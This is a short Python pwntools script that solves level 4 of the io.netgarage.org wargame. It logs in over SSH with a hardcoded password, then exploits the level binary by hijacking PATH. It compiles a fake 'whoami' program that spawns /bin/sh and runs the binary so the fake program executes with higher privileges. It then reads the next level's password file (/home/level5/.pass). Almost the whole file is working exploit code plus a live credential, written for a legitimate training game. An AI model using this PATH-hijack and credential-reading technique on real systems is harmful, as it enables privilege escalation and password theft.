from pwn import *
s = ssh(user='level4', host='io.netgarage.org', password='7WhHa5HWMNRAYl9T', port=22)
# game at http://io.netgarage.org/
sh = s.run('bash')
# create a directory that we have write permissions on
exploit = b'mkdir /tmp/temp; cd /tmp/temp; '
# create a C program that gives us a shell
exploit += b'echo \'#include <stdlib.h>\nint main(){\nsystem("/bin/sh");\nreturn 0;\n}\' > whoami.c; '
# compile the binary as whoami
exploit += b'gcc whoami.c -o whoami; '
# replace whoami in PATH so the program executes it
exploit += b'PATH=.:$PATH; /levels/level04'
sh.sendline(exploit)
for i in range(3):
    print(sh.recvline(timeout=2))
sh.sendline(b'cat /home/level5/.pass')
log.info('Password : '+sh.recvline(timeout=2).decode('utf-8')[8:])
s.close()
